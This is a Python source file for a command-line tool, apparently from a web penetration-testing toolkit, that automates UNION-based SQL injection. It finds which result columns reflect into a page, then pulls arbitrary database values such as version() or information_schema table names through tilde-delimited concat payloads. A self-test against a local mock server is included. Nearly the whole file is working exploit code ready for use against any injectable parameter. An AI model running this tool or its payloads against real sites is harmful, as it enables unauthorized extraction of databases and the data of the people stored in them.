#!/usr/bin/env python3
"""UNION SELECT exploitation: find the reflecting column, then pull
values through it with tilde-delimited extraction.

sqli_probe's --order-by names the column count; this tool takes the
next two mechanical steps: fire `UNION SELECT NULL,...,markNk,...,NULL`
per position to learn which columns render in the page, then fire one
payload per scalar SQL expression wrapped in concat(0x7e,EXPR,0x7e) —
the ~ delimiters turn "the value is somewhere in the layout" into a
regex extract.

  python3 tools/web/sqli_union.py --url URL --param id --cols 3 find
  python3 tools/web/sqli_union.py --url URL --param id --cols 3 sql --pos 2 --expr 'version()'
  python3 tools/web/sqli_union.py --url URL --param id --cols 3 sql --pos 2 --expr 'group_concat(table_name) from information_schema.tables'
  python3 tools/web/sqli_union.py --selftest

Injection prefix defaults to `' ` and suffix `-- -`; override for your
dialect. Bounded: find costs --cols requests, sql costs one. Output
carries the verbatim response window around the extraction — the
evidence the skill's verbatim-excerpt gate requires.
"""
import argparse, json, os, re, sys
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import httpkit  # noqa: E402


def _inject(url, param, payload, method, body_t, headers, timeout):
    ph = quote(payload)
    if method == "GET":
        u = url + ("&" if "?" in url else "?") + param + "=" + ph
        return httpkit.request(u, timeout=timeout, headers=headers)
    body = (body_t or param + "={M}").replace("{M}", ph)
    return httpkit.request(url, method="POST", body=body,
                           headers=headers, timeout=timeout)


def _union(cols, expr, pos, prefix, suffix):
    sel = ["NULL"] * cols
    if pos is not None:
        sel[pos - 1] = expr
    return "%s UNION SELECT %s %s" % (prefix, ",".join(sel), suffix)


def find(url, param, cols, method, body_t, prefix, suffix, headers,
         timeout):
    hits, probes = [], []
    for pos in range(1, cols + 1):
        mark = "mark%drk" % pos
        r = _inject(url, param,
                    _union(cols, "'%s'" % mark, pos, prefix, suffix),
                    method, body_t, headers, timeout)
        if not r["ok"]:
            probes.append({"pos": pos, "error": r["error"]})
            continue
        reflected = mark in r["body"]
        probes.append({"pos": pos, "status": r["status"],
                       "len": len(r["body"]), "reflected": reflected})
        if reflected:
            hits.append(pos)
    return {"reflecting": hits, "probes": probes,
            "note": "reflecting positions render into the page — put "
                    "the tilde-wrapped expression at the first one"}


def extract(url, param, cols, pos, expr, method, body_t, prefix, suffix,
            headers, timeout):
    wrapped = "concat(0x7e,%s,0x7e)" % expr
    payload = _union(cols, wrapped, pos, prefix, suffix)
    r = _inject(url, param, payload, method, body_t, headers, timeout)
    if not r["ok"]:
        return {"error": r["error"], "payload": payload}
    m = re.findall(r"~([^~]*)~", r["body"])
    i = r["body"].find("~")
    window = r["body"][max(0, i - 80):i + 200] if i >= 0 else ""
    return {"payload": payload, "status": r["status"],
            "extracted": m, "evidence_window": window,
            "note": "empty extracted with 200 means the column did not "
                    "render — run find first, or the DB is not MySQL "
                    "(concat/0x7e is MySQL dialect)"}


def _selftest() -> int:
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from threading import Thread
    from urllib.parse import urlparse, parse_qs, unquote

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            q = parse_qs(urlparse(self.path).query)
            inj = unquote(q.get("id", [""])[0])
            m = re.search(r"UNION SELECT (.*?) --", inj)
            self.send_response(200)
            self.end_headers()
            if m:
                cols = _split_top(m.group(1))
                # "server" renders every column joined
                rendered = " | ".join(
                    _eval(c) for c in cols)
                self.wfile.write(b"<td>" + rendered.encode() + b"</td>")
            else:
                self.wfile.write(b"<td>1</td>")

        def log_message(self, *a):
            pass

    def _split_top(s):
        out, depth, cur = [], 0, ""
        for ch in s:
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
            if ch == "," and depth == 0:
                out.append(cur.strip())
                cur = ""
            else:
                cur += ch
        out.append(cur.strip())
        return out

    def _eval(c):
        if c.startswith("'") and c.endswith("'"):
            return c[1:-1]
        if c.startswith("concat(0x7e,"):
            inner = c[len("concat(0x7e,"):-len(",0x7e)")]
            return "~" + {"version()": "8.0.33-ctf"}.get(inner, inner) + "~"
        return "1" if c == "NULL" else c

    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    Thread(target=srv.serve_forever, daemon=True).start()
    try:
        u = "http://127.0.0.1:%d/" % srv.server_port
        r = find(u, "id", 3, "GET", None, "' ", " -- -", None, 10)
        assert r["reflecting"] == [1, 2, 3], r
        r2 = extract(u, "id", 3, 2, "version()", "GET", None, "' ",
                     " -- -", None, 10)
        assert r2["extracted"] == ["8.0.33-ctf"], r2
    finally:
        srv.shutdown()
    print("sqli_union selftest: ok")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("cmd", nargs="?", choices=["find", "sql"],
                    default="find")
    ap.add_argument("--url")
    ap.add_argument("--param")
    ap.add_argument("--cols", type=int)
    ap.add_argument("--pos", type=int)
    ap.add_argument("--expr")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--body")
    ap.add_argument("--prefix", default="' ")
    ap.add_argument("--suffix", default=" -- -")
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not (a.url and a.param and a.cols):
        ap.error("--url --param --cols are required")
    if a.cmd == "find":
        out = find(a.url, a.param, a.cols, a.method, a.body, a.prefix,
                   a.suffix, a.headers, a.timeout)
    else:
        if not (a.pos and a.expr):
            ap.error("sql needs --pos and --expr")
        out = extract(a.url, a.param, a.cols, a.pos, a.expr, a.method,
                      a.body, a.prefix, a.suffix, a.headers, a.timeout)
    print(json.dumps(out, indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
